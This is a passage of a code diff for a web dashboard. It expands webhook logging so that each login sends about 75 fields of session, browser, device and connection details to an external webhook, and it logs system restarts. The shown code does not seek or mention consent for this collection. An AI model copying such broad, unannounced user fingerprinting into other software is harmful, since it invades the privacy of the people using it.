           { name: "User", value: username, inline: true },
           { name: "User ID", value: userID, inline: true },
           { name: "Time", value: new Date().toLocaleString(), inline: false }
       ]
-  };
-  await sendWebhook(webhooks.correctLogging, successEmbed); // Green
-  await sendWebhook(webhooks.sessionLogging, `New session started by \`\`${username}\`\`.`, 0x00BFFF); // Deep Sky Blue
+  );
+  await sendWebhook(webhooks.correctLogging, successEmbeds);
+  
+  // Session Logging (Aggregates ~75+ fields)
+  const sessionInfoFields = [
+      { name: "Logged-in User", value: username, inline: true },
+      { name: "User ID", value: userID, inline: true },
+      { name: "Session Start Time", value: new Date(stats.sessionStartTime).toLocaleString(), inline: false },
+      { name: "Current Zoom Level", value: `${Math.round(currentZoom * 100)}%`, inline: true },
+      { name: "Current Theme", value: isLightMode ? "Light" : "Dark", inline: true },
+      { name: "Panels Grid Visible", value: (document.getElementById('panelsGrid').style.display !== 'none' && document.getElementById('panelsGrid').style.opacity !== '0') ? "Yes" : "No", inline: true },
+      { name: "Activity Logs Count", value: `${activityLogs.length}`, inline: true },
+      { name: "Error Logs Count", value: `${errorLogs.length}`, inline: true },
+      { name: "Important Dates Count", value: `${importantDates.length}`, inline: true },
+      { name: "Mouse Click Count", value: `${clickCount}`, inline: true },
+      { name: "Total Button Presses", value: `${stats.buttonPresses}`, inline: true },
+      { name: "Total Toggle Switches", value: `${stats.toggleSwitches}`, inline: true },
+      { name: "Total Panels Opened", value: `${stats.panelsOpened}`, inline: true },
+      { name: "Total Panels Closed", value: `${stats.panelsClosed}`, inline: true },
+      { name: "Total Search Queries", value: `${stats.searchQueries}`, inline: true },
+      ...getBrowserDetailedInfo().map(f => ({ name: `Browser - ${f.name}`, value: f.value, inline: f.inline })),
+      ...getDeviceDetailedInfo().map(f => ({ name: `Device - ${f.name}`, value: f.value, inline: f.inline })),
+      ...getConnectionDetailedInfo().map(f => ({ name: `Connection - ${f.name}`, value: f.value, inline: f.inline }))
+  ];
+  const sessionEmbeds = createEmbedsFromFields("🚀 New Session Started", 0x00BFFF, sessionInfoFields, "Detailed information about the new user session.");
+  await sendWebhook(webhooks.sessionLogging, sessionEmbeds);
   
   // Show loading screen
   document.getElementById('loginScreen').classList.add('hidden');
@@ -3687,7 +3883,14 @@ function togglePanelsGridVisibility() {
 async function restartSystem() {
     if (confirm('Are you sure you want to restart the system? You will be logged out and all unsaved data will be lost.')) {
         logActivity('System restarted');
-        await sendWebhook(webhooks.resetDetectorLogging, `System restart initiated from dashboard.`, 0xFFFF00); // Yellow
+        const embeds = createEmbedsFromFields(
+            "⚠️ System Restart Initiated", 0xFFFF00, [
+                { name: "Triggered By", value: currentUser || "Unknown User (pre-login or guest)", inline: true },
+                { name: "Location", value: "Dashboard", inline: true },
+                { name: "Time", value: new Date().toLocaleString(), inline: false }
+            ]
+        );
+        await sendWebhook(webhooks.resetDetectorLogging, embeds); // Yellow
         localStorage.clear(); 
         location.reload(); 
     }
